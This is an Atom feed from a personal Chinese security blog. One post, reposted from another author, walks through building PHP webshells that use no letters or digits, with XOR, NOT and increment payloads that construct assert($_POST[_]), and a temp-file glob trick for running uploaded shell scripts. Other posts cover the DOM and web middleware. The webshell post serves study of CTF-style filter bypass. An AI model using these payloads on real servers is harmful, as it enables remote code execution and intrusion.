<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XYTK&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xytk0x0.github.io/"/>
  <updated>2019-10-27T13:58:38.884Z</updated>
  <id>https://xytk0x0.github.io/</id>
  
  <author>
    <name>XYTK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>没有真正的感同身受</title>
    <link href="https://xytk0x0.github.io/2019/10/27/%E6%B2%A1%E6%9C%89%E7%9C%9F%E6%AD%A3%E7%9A%84%E6%84%9F%E5%90%8C%E8%BA%AB%E5%8F%97/"/>
    <id>https://xytk0x0.github.io/2019/10/27/没有真正的感同身受/</id>
    <published>2019-10-27T05:58:36.000Z</published>
    <updated>2019-10-27T13:58:38.884Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dc624f33d5143fc966a1601986553e47df3c3e0af80227d6672ee4cdf31521fe"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>DOM文档对象模型</title>
    <link href="https://xytk0x0.github.io/2019/10/27/DOM%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/"/>
    <id>https://xytk0x0.github.io/2019/10/27/DOM文档对象模型/</id>
    <published>2019-10-27T01:56:56.000Z</published>
    <updated>2019-10-27T02:17:09.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DOM的概念"><a href="#DOM的概念" class="headerlink" title="DOM的概念"></a>DOM的概念</h1><p>DOM<strong>(Document Object Model)</strong>，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p><p>在 HTML DOM 中，所有事物都是节点。DOM 是被视为节点树的 HTML</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整个文档是一个文档节点</span><br><span class="line">每个 HTML 元素是元素节点</span><br><span class="line">HTML 元素内的文本是文本节点</span><br><span class="line">每个 HTML 属性是属性节点</span><br><span class="line">注释是注释节点</span><br></pre></td></tr></table></figure><img src="/2019/10/27/DOM文档对象模型/0.png" title="XYTK"><h1 id="HTML-DOM-的方法和属性"><a href="#HTML-DOM-的方法和属性" class="headerlink" title="HTML DOM 的方法和属性"></a>HTML DOM 的方法和属性</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTML DOM 方法：</span><br><span class="line"></span><br><span class="line">getElementById(id) - 获取带有指定 id 的节点（元素）</span><br><span class="line">appendChild(node) - 插入新的子节点（元素）</span><br><span class="line">removeChild(node) - 删除子节点（元素）</span><br><span class="line"></span><br><span class="line">HTML DOM 属性：</span><br><span class="line"></span><br><span class="line">innerHTML - 节点（元素）的文本值</span><br><span class="line">parentNode - 节点（元素）的父节点</span><br><span class="line">childNodes - 节点（元素）的子节点</span><br><span class="line">attributes - 节点（元素）的属性节点</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DOM的概念&quot;&gt;&lt;a href=&quot;#DOM的概念&quot; class=&quot;headerlink&quot; title=&quot;DOM的概念&quot;&gt;&lt;/a&gt;DOM的概念&lt;/h1&gt;&lt;p&gt;DOM&lt;strong&gt;(Document Object Model)&lt;/strong&gt;，是一个平台和语言都中
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字的webshell</title>
    <link href="https://xytk0x0.github.io/2019/10/26/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell/"/>
    <id>https://xytk0x0.github.io/2019/10/26/无字母数字的webshell/</id>
    <published>2019-10-26T09:12:54.000Z</published>
    <updated>2019-10-28T03:25:59.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>p神原文。</p><p>链接： </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></p><p><a href="https://www.guildhab.top/?p=201" target="_blank" rel="noopener">https://www.guildhab.top/?p=201</a></p><hr><h1 id="一些不包含数字和字母的webshell"><a href="#一些不包含数字和字母的webshell" class="headerlink" title="一些不包含数字和字母的webshell"></a>一些不包含数字和字母的webshell</h1><p>“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，这个代码如何利用？</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，变换方法 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</span><br><span class="line">$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><img src="/2019/10/26/无字母数字的webshell/0.jpg" title="XYTK"><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s：</p><img src="/2019/10/26/无字母数字的webshell/1.jpg" title="XYTK"><p>选择一些汉字，生成如下答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><img src="/2019/10/26/无字母数字的webshell/2.jpg" title="XYTK"><p>这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.increment.php</a></p><img src="/2019/10/26/无字母数字的webshell/3.jpg" title="XYTK"><p>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><img src="/2019/10/26/无字母数字的webshell/4.jpg" title="XYTK"><p>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><img src="/2019/10/26/无字母数字的webshell/5.jpg" title="XYTK"><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/2019/10/26/无字母数字的webshell/6.jpg" title="XYTK"><hr><h1 id="无字母数字webshell之提高篇"><a href="#无字母数字webshell之提高篇" class="headerlink" title="无字母数字webshell之提高篇"></a>无字母数字webshell之提高篇</h1><p>前几天有同学提出了一个问题，大概代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码如果要getshell，怎样利用？</p><p>这题可能来自是我曾写过的一篇文章：《一些不包含数字和字母的webshell》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：</p><p>1、利用位运算<br>2、利用自增运算符</p><p>当然，这道题多了两个限制：</p><p>webshell长度不超过35位<br>除了不包含字母数字，还不能包含$和_<br>难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为$不能使用了，所以我们无法构造PHP中的变量。</p><p>所以，如何解决这个问题？</p><h2 id="PHP7下简单解决问题"><a href="#PHP7下简单解决问题" class="headerlink" title="PHP7下简单解决问题"></a>PHP7下简单解决问题</h2><p>我们将上述代码放在index.php中，然后执行docker run –rm -p 9090:80 -v <code>pwd</code>:/var/www/html php:7.2-apache，启动一个php 7.2的服务器。</p><p>php7中修改了表达式执行的顺序： <a href="http://php.net/manual/zh/migration70.incompatible.php" target="_blank" rel="noopener">http://php.net/manual/zh/migration70.incompatible.php</a> ：</p><img src="/2019/10/26/无字母数字的webshell/7.png" title="XYTK"><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><blockquote><p>(~%8F%97%8F%96%91%99%90)();</p></blockquote><img src="/2019/10/26/无字母数字的webshell/8.png" title="XYTK"><h2 id="PHP5的思考"><a href="#PHP5的思考" class="headerlink" title="PHP5的思考"></a>PHP5的思考</h2><p>我们使用docker run –rm -p 9090:80 -v <code>pwd</code>:/var/www/html php:5.6-apach来运行一个php5.6的web环境。</p><p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p><img src="/2019/10/26/无字母数字的webshell/9.png" title="XYTK"><p>原因就是php5并不支持这种表达方式。</p><p>在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。</p><p>当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。</p><p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p><p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p><h2 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h2><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、$的系统命令来getshell？</p><p>好像问题又回到了原点：无字母、数字、$，在shell中仍然是一个难题。</p><p>此时我想到了两个有趣的Linux shell知识点：</p><p>1.shell下可以利用.来执行任意脚本</p><p>2.Linux文件名支持用glob通配符代替</p><p>第一点曾在《 小密圈里的那些奇技淫巧 》露出过一角，但我没细讲。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。</p><p>用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符：</p><p>*可以代替0个及以上任意字符</p><p>?可以代表1个任意字符</p><p>那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。</p><p>但我们尝试执行. /???/?????????，却得到如下错误：</p><img src="/2019/10/26/无字母数字的webshell/10.png" title="XYTK"><p>这是因为，能够匹配上/???/?????????这个通配符的文件有很多，我们可以列出来：</p><img src="/2019/10/26/无字母数字的webshell/11.png" title="XYTK"><p>可见，我们要执行的/tmp/phpcjggLC排在倒数第二位。然而，在执行第一个匹配上的文件（即/bin/run-parts）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><h2 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h2><p>大部分同学对于通配符，可能知道的都只有*和?。但实际上，阅读Linux的文档（ <a href="http://man7.org/linux/man-pages/man7/glob.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p><p>其中，glob支持用[^x]的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉/bin/run-parts：</p><img src="/2019/10/26/无字母数字的webshell/12.png" title="XYTK"><p>排除了第4个字符是-的文件，同样我们可以排除包含.的文件：</p><img src="/2019/10/26/无字母数字的webshell/13.png" title="XYTK"><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，我发现另一个有趣的用法：</p><img src="/2019/10/26/无字母数字的webshell/14.png" title="XYTK"><p>就跟正则表达式类似，glob支持利用[0-9]来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><img src="/2019/10/26/无字母数字的webshell/15.png" title="XYTK"><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于@与[之间：</p><img src="/2019/10/26/无字母数字的webshell/16.jpg" title="XYTK"><p>那么，我们可以利用[@-[]来表示大写字母：</p><img src="/2019/10/26/无字母数字的webshell/17.png" title="XYTK"><h2 id="构造POC，执行任意命令"><a href="#构造POC，执行任意命令" class="headerlink" title="构造POC，执行任意命令"></a>构造POC，执行任意命令</h2><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为?&gt;<?=. /???/????????[@-[];?>，发送数据包如下：</p><img src="/2019/10/26/无字母数字的webshell/18.png" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;p神原文。&lt;/p&gt;
&lt;p&gt;链接： &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATI
      
    
    </summary>
    
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="webshell" scheme="https://xytk0x0.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>【转载】web服务器、web中间件和web容器的区别</title>
    <link href="https://xytk0x0.github.io/2019/10/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91web%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%92%8Cweb%E5%AE%B9%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://xytk0x0.github.io/2019/10/26/【转载】web服务器、web中间件和web容器的区别/</id>
    <published>2019-10-26T01:07:15.000Z</published>
    <updated>2019-10-26T03:35:51.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看web方向的东西也挺长时间了，这些概念还是区分不清，正好看见一篇博客具体介绍了这些概念。</p><p>原文链接： </p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84501439" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84501439</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84261392" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84261392</a></p><hr><h1 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h1><p><strong>广义的web服务器（Web Server）：</strong>提供web服务的软件或主机，即Web服务器软件或装有Web服务器软件的计算机。例如：IIS、apache、nginx等。Web服务器可以处理 HTTP 协议，响应针对静态页面或图片的请求，进行页面跳转，或者把动态请求委托其它程序（它的扩展、某种语言的解释引擎(php)、Web容器）。</p><p>所以，我们可以把 IIS、Apache、Nginx、Tomcat等都称为Web服务器，因为他们都提供了web服务。</p><hr><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p><strong>中间件（Middleware）</strong>是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p><p>而<strong>Web中间件</strong>就是提供web应用软件和系统软件连接的软件的一个总称。</p><h2 id="Java-web中间件"><a href="#Java-web中间件" class="headerlink" title="Java web中间件"></a>Java web中间件</h2><img src="/2019/10/26/【转载】web服务器、web中间件和web容器的区别/0.png" title="XYTK"><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat 是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Java Web 应用服务器(Servlet 容器)。实际上Tomcat 部分是Apache 服务器的扩展，但它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat默认使用 8080 号端口</p><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p>WebLogic 是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。Weblogic默认端口是 7001。</p><h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>Jboss 是一个基于Java EE的开放源代码的应用服务器。 它不但是Servlet容器，而且也是EJB容器，从而受到企业级开发人员的欢迎，从而弥补了Tomcat只是一个Servlet容器的缺憾。JBoss是一个管理EJB的容器和服务器。但JBoss核心服务不包括支持 servlet/JSP 的WEB容器，一般与 Tomcat 或 Jetty 绑定使用。Jboss默认端口号是8080。</p><h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p>Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用JAVA编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。</p><h3 id="Webshere"><a href="#Webshere" class="headerlink" title="Webshere"></a>Webshere</h3><p>WebShere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件。WebSphere 是一个模块化的平台，基于业界支持的开放标准。可以通过受信任和持久的接口，将现有资产插入 WebSphere，可以继续扩展环境。WebSphere 可以在许多平台上运行，包括 Intel、Linux 和 z/OS。Webshere默认端口号是 9080。</p><h3 id="Glasshfish"><a href="#Glasshfish" class="headerlink" title="Glasshfish"></a>Glasshfish</h3><p>GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改</p><hr><h1 id="容器"><a href="#容器" class="headerlink" 